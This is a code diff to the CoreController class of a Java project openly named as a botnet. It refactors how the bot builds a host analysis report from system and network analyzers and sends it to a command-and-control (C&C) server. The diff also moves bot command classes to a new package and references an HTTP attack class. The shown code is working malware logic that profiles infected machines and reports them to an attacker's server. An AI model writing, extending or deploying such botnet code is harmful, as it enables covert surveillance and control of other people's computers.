@@ -32,8 +32,8 @@ import com.acmutv.botnet.core.analysis.Analyzer;
 import com.acmutv.botnet.core.analysis.NetworkAnalyzer;
 import com.acmutv.botnet.core.analysis.SystemAnalyzer;
 import com.acmutv.botnet.core.attack.HttpAttack;
-import com.acmutv.botnet.core.command.BotCommand;
-import com.acmutv.botnet.core.command.BotCommandService;
+import com.acmutv.botnet.core.control.command.BotCommand;
+import com.acmutv.botnet.core.control.command.BotCommandService;
 import com.acmutv.botnet.core.exception.*;
 import com.acmutv.botnet.core.pool.BotPool;
 import com.acmutv.botnet.core.report.*;
@@ -128,7 +128,10 @@ public class CoreController {
           }
 
           try {
-            sendReport();
+            Report hostAnalysis = makeReport();
+            sendReport(hostAnalysis);
+          } catch (BotAnalysisException exc) {
+            LOGGER.warn("Cannot analyze local host. {}", exc.getMessage());
           } catch (BotExecutionException exc) {
             LOGGER.warn("Cannot send report to C&C. {}", exc.getMessage());
           }
@@ -145,7 +148,7 @@ public class CoreController {
 
       try {
         pollingWait();
-      } catch (InterruptedException exc) { }
+      } catch (InterruptedException ignored) { }
     }
   }
 
@@ -406,17 +409,27 @@ public class CoreController {
   }
 
   /**
-   * Sends analysis reports to CC, as specified in {@link AppConfiguration}.
-   * @throws BotExecutionException when bot cannot send report to CC.
+   * Generates a local host analysis report.
+   * @return the local host analysis report.
+   * @throws BotAnalysisException when local host analysis cannot be correctly executed.
    */
-  private static void sendReport() throws BotExecutionException {
+  public static Report makeReport() throws BotAnalysisException {
     LOGGER.trace("Producing host analysis reports...");
     Report report = new SimpleReport();
-    ANALYZERS.stream().forEach(analyzer -> {
+    for (Analyzer analyzer : ANALYZERS) {
       final Report analysisReport = analyzer.makeReport();
       report.merge(analysisReport);
-    });
+    }
     LOGGER.trace("Final report produced");
+    return report;
+  }
+
+  /**
+   * Sends analysis reports to CC, as specified in {@link AppConfiguration}.
+   * @param report the report to send.
+   * @throws BotExecutionException when bot cannot send report to CC.
+   */
+  private static void sendReport(Report report) throws BotExecutionException {
     final String logResource = AppConfigurationService.getConfigurations().getLogResource();
     LOGGER.info("Sending analysis to C&C at {}...", logResource);
     final String json = report.toJson();
